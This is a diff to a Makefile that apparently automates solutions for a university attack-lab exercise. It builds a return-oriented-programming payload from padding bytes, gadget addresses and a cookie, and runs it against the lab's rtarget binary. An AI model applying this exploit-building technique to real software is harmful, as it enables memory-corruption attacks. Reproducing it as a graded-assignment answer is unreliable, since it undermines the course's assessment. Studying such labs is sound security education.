@@ -29,6 +29,8 @@ G_POP_RAX_STR := cc 8b 80 00 00 00 00 00
 G_MOV_RAX_RDI := 0x808bda
 G_MOV_RAX_RDI_STR := da 8b 80 00 00 00 00 00
 
+all: level1 level2 level3 rlevel2
+
 disas_ctarget:
 	mkdir -p $(OUT)
 	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
@@ -114,16 +116,16 @@ level3: $(OUT)/level3_payload.hex disas_ctarget
 
 rlevel2: disas_rtarget
 	mkdir -p $(SRC)
-	rm -f $(SRC)/target04.txt
+	rm -f $(SRC)/rtarget02.txt
 	for i in `seq 24`; do \
-		echo -n "41 " >> $(SRC)/target04.txt; \
+		echo -n "41 " >> $(SRC)/rtarget02.txt; \
 	done
-	echo -n $(G_POP_RAX_STR) >> $(SRC)/target04.txt
-	echo -n " " >> $(SRC)/target04.txt
-	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/target04.txt
-	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/target04.txt
-	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/target04.txt
-	$(HEX2RAW) < $(SRC)/target04.txt > $(OUT)/rtarget02-raw
+	echo -n $(G_POP_RAX_STR) >> $(SRC)/rtarget02.txt
+	echo -n " " >> $(SRC)/rtarget02.txt
+	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/rtarget02.txt
+	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/rtarget02.txt
+	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/rtarget02.txt
+	$(HEX2RAW) < $(SRC)/rtarget02.txt > $(OUT)/rtarget02-raw
 	$(RTARGET) < $(OUT)/rtarget02-raw
 
 
@@ -144,6 +146,9 @@ clean_level2:
 clean_level3:
 	rm -rf $(OUT)/level3_payload.s $(OUT)/level3_payload.o $(OUT)/level3_payload.d $(OUT)/level3_payload.hex
 	rm -rf $(SRC)/ctarget03.txt
+
+clean_rlevel2:
+	rm -rf $(SRC)/rtarget02.txt
 
 clean:
 	rm -rf $(OUT)
